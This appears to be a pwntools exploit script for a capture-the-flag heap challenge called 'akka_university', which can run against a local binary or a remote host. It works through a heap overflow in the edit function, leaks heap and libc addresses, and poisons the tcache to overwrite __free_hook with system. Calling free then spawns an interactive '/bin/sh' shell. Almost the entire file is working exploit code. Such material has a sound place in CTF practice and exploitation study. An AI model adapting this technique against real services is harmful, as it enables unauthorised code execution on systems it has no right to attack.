#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF('./akka_university')
libc = ELF('./libc.so.6')

host, port = "3.99.48.161", "9006"

if args.REMOTE:
  p = remote(host,port)
  print('connecting to host..')
else:
  p = process(exe.path)

def add(size, name, marks, remarks, log ):
  p.sendlineafter('>>','1')
  p.sendlineafter('record\n>>', str(size))
  p.sendafter('name\n>>', name)		# max size 0x14 (20)
  p.sendlineafter('marks\n>>', str(marks))	# int between 40 to 100 (dword)
  p.sendafter('Students\n>>', remarks)		# max size 0x38 (56)
  p.sendafter('paper\n>>', log)			# malloc bloc allocated size

def adda(size, data):
  add(size, 'A'*0x14, 40, 'B'*0x38, data)

def free(idx):
  p.sendlineafter('>>','2')
  p.sendlineafter('record\n>>', str(idx))

def show(idx):
  p.sendlineafter('>>','3')
  p.sendlineafter('view\n>>', str(idx))

def edit(idx, name, marks, remarks, log):
  p.sendlineafter('>>','4')
  p.sendlineafter('edit\n>>', str(idx))
  p.sendlineafter('name\n>>', name)
  p.sendlineafter('marks\n>>', str(marks))      # int between 40 to 100 (dword)
  p.sendafter('Students\n>>', remarks)          # max size 0x38 (56)
  p.sendafter('paper\n>>', log)                 # malloc bloc allocated size

adda(0x18, 'A')		# bloc 0   --> no use we just free it to get a heap address
adda(0x18, 'B')		# bloc 1   --> we will use this one, to write on the heap, via the edit function vulnerability
adda(0x88, 'C')		# bloc 2   --> this one will be freed to go in unsorted, and get a libc leak
adda(0x38, 'D')		# bloc 3  --> stop bloc
free(0)			# we free the first bloc, to put a heap address on heap for our leak

# modify heap address of bloc1 to point on freed bloc 0 bk pointer
edit(1, 'A'*0x14, 40, 'a'*56+'\xa8', '\x10')
show(1)
p.recvuntil('contents\n', drop=True)
leak1 = u64(p.recv(8))
print('leak heap = '+hex(leak1))
heap_base = leak1-0x10

# set 0x90 tcache->counts to 7 (full tcache)
edit(1, 'A'*0x14, 40, b'a'*56+p16((leak1+14) & 0xffff), '\x07')

# as there is now 7 (non existing) blocs in tcache 0x90 list, freeing a 0x88 bloc , will go in unsorted
free(2)

# edit bloc 1 heap address, to make it point to bk/fd libc pointers leaved by freeing 0x88 bloc
edit(1, 'A'*0x14, 40, b'a'*56+p16((leak1+0x2d0) & 0xffff), '\xe0')

show(1)
# get our libc leak & calculate libc base
p.recvuntil('contents\n', drop=True)
leak2 = u64(p.recv(8))
print('leak libc = '+hex(leak2))
libc.address = leak2 - 0x1ebbe0
print('libc base = '+hex(libc.address))

# now modify head pointer of 0x20 blocs in tcache to points to __free_hook-16 (__free_hook-8 could works also but not in later libc, because of alignement)
edit(1, '/bin/sh'.ljust(0x14,'\x00'), 40, b'a'*56+p16((leak1+0x80) & 0xffff), p64(libc.symbols['__free_hook']-16) )

# get an allocation near __free_hook, put '/bin/sh' string in the qword before __free_hook, and system address in __free_hook
adda(0x18, b'/bin/sh'.ljust(16,b'\x00')+p64(libc.symbols['system']))	# bloc 4

# when free will be called on bloc 4 , system('/bin/sh') well be executed
free(4)

p.interactive()

